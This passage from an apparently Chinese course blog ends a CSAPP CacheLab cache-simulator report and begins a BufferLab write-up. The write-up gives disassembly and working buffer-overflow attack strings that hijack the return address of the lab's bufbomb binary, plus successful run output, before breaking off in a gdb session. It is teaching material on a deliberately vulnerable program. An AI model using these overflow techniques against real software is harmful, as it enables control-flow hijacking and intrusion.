<span class="number">0</span>) &#123;</span><br><span class="line">                    csim_error_missing_argument();</span><br><span class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</span><br><span class="line">                &#125;</span><br><span class="line">                s = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                line_number = atoi(optarg);</span><br><span class="line">                <span class="keyword">if</span> (line_number == <span class="number">0</span>) &#123;</span><br><span class="line">                    csim_error_missing_argument();</span><br><span class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</span><br><span class="line">                &#125;</span><br><span class="line">                E = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">                block_offset = atoi(optarg);</span><br><span class="line">                <span class="keyword">if</span> (block_offset == <span class="number">0</span>) &#123;</span><br><span class="line">                    csim_error_missing_argument();</span><br><span class="line">                    <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</span><br><span class="line">                &#125;</span><br><span class="line">                b = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                t = <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">strcpy</span>(file_path, optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                csim_print_help_info();</span><br><span class="line">                <span class="keyword">return</span> CSIM_ERROR_INVALID_OPTION;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">1</span>) &#123;</span><br><span class="line">        csim_print_help_info();</span><br><span class="line">        <span class="keyword">return</span> CSIM_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (v == <span class="number">1</span>) &#123;</span><br><span class="line">        verbose_flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!(s == <span class="number">1</span> &amp;&amp; E == <span class="number">1</span> &amp;&amp; b == <span class="number">1</span> &amp;&amp; t == <span class="number">1</span>)) &#123;</span><br><span class="line">        csim_error_missing_argument();</span><br><span class="line">        <span class="keyword">return</span> CSIM_ERROR_MISSING_ARGUMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* file processing */</span></span><br><span class="line">    FILE * file_pointer = fopen(file_path, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_pointer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        csim_error_file_cannot_open(file_path);</span><br><span class="line">        <span class="keyword">return</span> CSIM_ERROR_FILE_CANNOT_OPEN;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* cache construction */</span></span><br><span class="line">    cache = csim_construct_cache(set_number, line_number, block_offset);</span><br><span class="line">    <span class="comment">/* trace file parsing */</span></span><br><span class="line">    summary = csim_parse_trace_file(cache, file_pointer, verbose_flag);</span><br><span class="line">    <span class="comment">/* summary */</span></span><br><span class="line">    printSummary(summary.hit, summary.miss, summary.evict);</span><br><span class="line">    <span class="comment">/* post operations */</span></span><br><span class="line">    csim_deconstruct_cache(&amp;cache);</span><br><span class="line">    fclose(file_pointer);</span><br><span class="line">    <span class="keyword">return</span> CSIM_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>自动评分脚本给出的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user@blackdragon ~/C/C/cachelab-handout&gt; ./<span class="built_in">test</span>-csim</span><br><span class="line">                        Your simulator     Reference simulator</span><br><span class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span><br><span class="line">    27</span><br><span class="line"></span><br><span class="line">TEST_CSIM_RESULTS=27</span><br></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>由于在寒假的课程设计中已经使用过了命令行参数解析以及复杂的数据结构设计与实验，Part A总体上来说不是很难，我主要的精力花费在代码风格上，希望代码能尽量具有良好的架构以及可读性。</p>
<p>本部分中犯的错误有，直接根据s设置缓存的组数，而实际上的组数是2^s个。循环中由于手误导致出现死循环。没有搞清楚inline static关键字而导致的编译错误等等。存在知识的盲区也存在着粗心导致的错误，以后还需要更加注意。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/07/08/深入理解计算机系统CacheLab-PartA实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/05/16/深入理解计算机系统BufferLab实验报告/">
                            深入理解计算机系统BufferLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-05-16T14:28:12+08:00">
	
		    5月 16, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/BufferLab" target="_blank" rel="noopener">Github</a>上</p>
<blockquote>
<p>Buffer Lab是《深入理解计算机系统》（第二版）中的缓冲区溢出实验，现在已经被Attack Lab替代。为了熟悉IA32的栈帧以及过程调用的原理，于2017年5月10日将该实验完成。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用缓冲区溢出漏洞生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
<p>该实验加深了对于栈规则的理解以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>该实验同Attack Lab非常相似，但是仅仅采用了代码注入攻击作为攻击手段。同时，也要注意x86和x86_64有着不同的栈帧以及过程的调用方式。</p>
<h3 id="IA32的栈帧以及过程调用"><a href="#IA32的栈帧以及过程调用" class="headerlink" title="IA32的栈帧以及过程调用"></a>IA32的栈帧以及过程调用</h3><h4 id="IA32的栈帧"><a href="#IA32的栈帧" class="headerlink" title="IA32的栈帧"></a>IA32的栈帧</h4><p>IA32的栈帧同x86的栈帧相似，栈从高地址向低地址增长。寄存器%esp保存的是栈帧的栈顶（低地址），寄存器%ebp保存的是栈帧的栈底（高地址）。</p>
<p>调用者的栈帧主要包括了参数区以及返回地址。</p>
<p>被调用者的栈帧的栈底首先是保存的寄存器ebp值（指向调用者的栈底），然后是被保存的寄存器，局部变量以及临时空间，最后是参数构造区。</p>
<h4 id="IA32的过程调用"><a href="#IA32的过程调用" class="headerlink" title="IA32的过程调用"></a>IA32的过程调用</h4><p>IA32提供了如下的过程调用指令：</p>
<ul>
<li>call 该指令将返回地址压入调用者的栈帧，并且将程序计数器%eip指向了被调用者的首地址</li>
<li>leave 该指令一般位于ret指令之前，等价于mov %ebp,%esp和pop %ebp，主要作用是回收栈空间，并且恢复栈顶（%esp）和栈底（%ebp）使得栈帧恢复为调用者栈帧</li>
<li>ret 该指令从栈中弹出返回地址并且让程序计数器eip指向该地址，使程序继续执行被调用者的下一条指令</li>
</ul>
<p>IA32的过程调用遵循如下的规则：</p>
<ol>
<li>首先执行call指令，call会在调用者的栈顶压入返回地址并且使程序计数器指向被调用者</li>
<li>然后保存调用者的栈底即push %ebp，并且将栈顶设置为被调用者的栈底即mov %esp,%ebp</li>
<li>分配局部的栈空间，主要用于临时变量的存储</li>
<li>执行被调用者的指令</li>
<li>执行leave，释放栈空间并重置栈顶（%esp）和栈底（%ebp），使得恢复为调用者栈帧</li>
<li>执行ret，过程返回并继续执行调用者的指令</li>
</ol>
<p>IA32的参数传递规则：<br>同x86不同，IA32不使用寄存器进行参数的传递，IA32从右到左将参数依次压栈，然后调用相应的过程。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中主要包含了以下3个可执行文件：</p>
<ul>
<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
<li>makecookie 根据你所输入的userid生成一个cookie</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<p>首先我们要输入userid生成一个cookie供后续使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie BlackDragon &gt; cookie                          </span><br><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie                                              </span><br><span class="line">0x3dde924c</span><br></pre></td></tr></table></figure></p>
<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; objdump -d bufbomb &gt; bufbomb-disassemble</span><br></pre></td></tr></table></figure></p>
<h3 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h3><p>目标程序的通过getbuf函数从标准输入流中读取字符串，并且该函数和Attack Lab中的函数一致，且具有缓冲区溢出的漏洞。这里不再赘述。</p>
<p>值得注意的是，bufbomb函数接受如下的参数：</p>
<ul>
<li>-h 打印帮助信息</li>
<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
<li>-n 进入’Nitro’模式，在阶段4中使用</li>
<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
</ul>
<p>同Attack Lab一样，你需要使用hex2raw从攻击代码生成相应的攻击字符串，这里也不再赘述。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="阶段0：蜡烛（Candle）"><a href="#阶段0：蜡烛（Candle）" class="headerlink" title="阶段0：蜡烛（Candle）"></a>阶段0：蜡烛（Candle）</h3><p>在本实验中，关键函数getbuf被test函数调用，getbuf和test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* getbuf */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE ??</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">Gets(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* test */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line"><span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</span><br><span class="line"></span><br><span class="line">val = getbuf();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for corrupted stack */</span></span><br><span class="line"><span class="keyword">if</span> (local != uniqueval()) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">validate(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Smoke!: You called smoke()\n"</span>);</span><br><span class="line">validate(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先我们需要确定缓冲区的大小，观察bufbomb-disassemble中getbuf的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">080491f4 &lt;getbuf&gt;:</span><br><span class="line"> 80491f4:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</span><br><span class="line"> 80491f5:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</span><br><span class="line"> 80491f7:       <span class="number">83</span> ec <span class="number">38</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x38,%esp</span><br><span class="line"> 80491fa:       <span class="number">8d</span> <span class="number">45</span> d8                <span class="keyword">lea</span>    -<span class="number">0x28</span>(%ebp),%eax</span><br><span class="line"> 80491fd:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                <span class="keyword">mov</span>    %eax,(%esp)</span><br><span class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          <span class="keyword">call</span>   8048cfa &lt;Gets&gt;</span><br><span class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"> 804920a:       c9                      <span class="keyword">leave</span>  </span><br><span class="line"> 804920b:       c3                      <span class="keyword">ret</span>   </span><br></pre></td></tr></table></figure></p>
<p>注意到函数总共开辟了0x38=56个字节的栈空间，然后lea -0x28(%ebp),%eax mov %eax,(%esp)进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而ebp指向栈底，我们可以推测缓冲区总共是0x28=40个字节。</p>
<p>经过实际测试，可以确定缓冲区确实是40个字节。</p>
<p>下面我们观察反汇编代码，可以得出函数smoke的起始地址为0x08048c18，根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">00 00 00 00 18 8c 04 08 /* 保存的%ebp以及返回地址 */</span><br></pre></td></tr></table></figure></p>
<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level0.txt|./hex2raw|./bufbomb -u BlackDragon             </span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line">run with level1</span><br></pre></td></tr></table></figure></p>
<p>阶段0完成。</p>
<h3 id="阶段1：火花（Sparkler）"><a href="#阶段1：火花（Sparkler）" class="headerlink" title="阶段1：火花（Sparkler）"></a>阶段1：火花（Sparkler）</h3><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>, val);</span><br><span class="line">validate(<span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: You called fizz(0x%x)\n"</span>, val);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">08048c42 &lt;fizz&gt;:</span><br><span class="line"> 8048c42:       <span class="number">55</span>                      <span class="keyword">push</span>   %ebp</span><br><span class="line"> 8048c43:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    %esp,%ebp</span><br><span class="line"> 8048c45:       <span class="number">83</span> ec <span class="number">18</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x18,%esp</span><br><span class="line"> 8048c48:       8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="number">0x8</span>(%ebp),%eax</span><br><span class="line"> 8048c4b:       3b <span class="number">05</span> <span class="number">08</span> d1 <span class="number">04</span> <span class="number">08</span>       <span class="keyword">cmp</span>    <span class="number">0x804d108</span>,%eax</span><br><span class="line"> 8048c51:       <span class="number">75</span> <span class="number">26</span>                   <span class="keyword">jne</span>    8048c79 &lt;fizz+<span class="number">0x37</span>&gt;</span><br><span class="line"> 8048c53:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</span><br><span class="line"> 8048c57:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> ee a4 <span class="number">04</span>    movl   <span class="number">$0</span>x804a4ee,<span class="number">0x4</span>(%esp)</span><br><span class="line"> 8048c5e:       <span class="number">08</span></span><br><span class="line"> 8048c5f:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048c66:       e8 <span class="number">55</span> fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048c6b:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048c72:       e8 <span class="number">04</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   804937b &lt;validate&gt;</span><br><span class="line"> 8048c77:       eb <span class="number">18</span>                   <span class="keyword">jmp</span>    8048c91 &lt;fizz+<span class="number">0x4f</span>&gt;</span><br><span class="line"> 8048c79:       <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>             <span class="keyword">mov</span>    %eax,<span class="number">0x8</span>(%esp)</span><br><span class="line"> 8048c7d:       c7 <span class="number">44</span> <span class="number">24</span> <span class="number">04</span> <span class="number">40</span> a3 <span class="number">04</span>    movl   <span class="number">$0</span>x804a340,<span class="number">0x4</span>(%esp)</span><br><span class="line"> 8048c84:       <span class="number">08</span></span><br><span class="line"> 8048c85:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x1,(%esp)</span><br><span class="line"> 8048c8c:       e8 2f fd ff ff          <span class="keyword">call</span>   80489c0 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048c91:       c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   <span class="number">$0</span>x0,(%esp)</span><br><span class="line"> 8048c98:       e8 <span class="number">63</span> fc ff ff          <span class="keyword">call</span>   <span class="number">8048900</span> &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></p>
<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数fizz的起始地址为0x08048c42，val保存在0x8(%ebp)中，cookie保存在固定的地址0x804d108中。根据以上的信息，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">00 00 00 00 42 8c 04 08 /* 保存的%ebp以及返回地址 */</span><br><span class="line">00 00 00 00 4c 92 de 3d /* cookie */</span><br></pre></td></tr></table></figure></p>
<p>在该攻击代码中，前48个字节同阶段0一样，只是将返回地址改成了了函数fizz的起始地址。而最后8个字节则是用来伪装成传递参数的。注意函数从getbuf返回后并不会真正的调用fizz函数，而只是依次的开始执行fizz的指令。</p>
<p>因此，从getbuf返回直到获取到参数val这整个过程中，首先getbuf返回会执行复位操作，将栈顶（%esp）指向第40个字节处（从0开始计算，下同），然后将0x0pop至栈底（%ebp），最后根据返回地址跳转至fizz并pop。现在栈顶（%esp）指向了第48个字节。紧接着，直接开始执行fizz的指令，将%ebp（0）入栈，直至执行到mov 0x8(%ebp),%eax，栈顶（%esp）指向第44个字节。所以，我们的cookie应当放在第(44+8=52）个字节处，直到第55个字节为止。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat level1.txt|./hex2raw|./bufbomb -u BlackDragon</span><br><span class="line">Userid: BlackDragon</span><br><span class="line">Cookie: 0x3dde924c</span><br><span class="line">Type string:Fizz!: You called fizz(0x3dde924c)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure></p>
<p>阶段1完成。</p>
<h3 id="阶段2：爆竹（FireCracker）"><a href="#阶段2：爆竹（FireCracker）" class="headerlink" title="阶段2：爆竹（FireCracker）"></a>阶段2：爆竹（FireCracker）</h3><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (global_value == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</span><br><span class="line">validate(<span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。</p>
<p>该阶段同Attack Lab第1部分的等级2相似，我们需要将程序计数器%eip指向栈，在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang。</p>
<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/B/buflab-handout&gt; gdb bufbomb                                           </span><br><span class="line">GNU gdb (GDB) 7.12.1</span><br><span class="line">Copyright (C) 2017 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-pc-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...<span 